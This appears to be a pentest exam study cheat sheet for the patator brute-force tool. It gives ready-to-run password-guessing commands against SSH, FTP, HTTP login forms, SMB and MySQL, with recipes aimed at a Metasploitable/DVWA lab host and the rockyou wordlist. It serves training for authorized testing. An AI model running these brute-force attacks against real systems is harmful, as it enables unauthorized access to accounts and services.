# patator — Multi-Purpose Brute Forcer

> "Alternative to Hydra/Medusa with more flexible syntax. Good for complex brute force scenarios."

**Install check:** `patator --help` or `sudo apt install patator`

---

## 🎯 Cheat-flow

| Service | Command |
|---|---|
| SSH | `patator ssh_login host=IP user=admin password=FILE0 0=rockyou.txt` |
| FTP | `patator ftp_login host=IP user=admin password=FILE0 0=rockyou.txt` |
| HTTP POST | `patator http_fuzz url=http://IP/login method=POST body="user=admin&pass=FILE0" 0=rockyou.txt -x ignore:fgrep="Login failed"` |
| SMB | `patator smb_login host=IP user=admin password=FILE0 0=rockyou.txt` |
| MySQL | `patator mysql_login host=IP user=root password=FILE0 0=rockyou.txt` |

---

## 🔑 Key Concepts

| Concept | Syntax |
|---|---|
| Wordlist file | `FILE0`, `FILE1`, etc. mapped with `0=path`, `1=path` |
| Ignore false positives | `-x ignore:fgrep="error text"` |
| Ignore by status code | `-x ignore:code=401` |
| Ignore by response size | `-x ignore:size=1234` |
| Threads | `--threads 4` |
| Rate limit | `--rate-limit 1` (1 request/sec) |

---

## 📋 Recipes

```bash
# 1. SSH brute force
patator ssh_login host=192.168.52.129 user=msfadmin password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Authentication failed.'

# 2. FTP brute force
patator ftp_login host=192.168.52.129 user=msfadmin password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Login incorrect.'

# 3. HTTP form brute force
patator http_fuzz url="http://192.168.52.129/dvwa/login.php" method=POST body="username=admin&password=FILE0&Login=Login" 0=/usr/share/wordlists/rockyou.txt -x ignore:fgrep="Login failed"

# 4. Multiple users + passwords
patator ssh_login host=192.168.52.129 user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg='Authentication failed.'
```

---

## 💡 Exam Tips

- Patator syntax is different from Hydra — `FILE0` placeholder system
- More flexible filtering with `-x ignore:` conditions
- Slower than Hydra by default but more customizable
- Use when Hydra fails or you need complex filtering

---

## 🔗 Related

- [hydra.md](hydra.md) — simpler syntax, most common
- [medusa.md](medusa.md) — another alternative
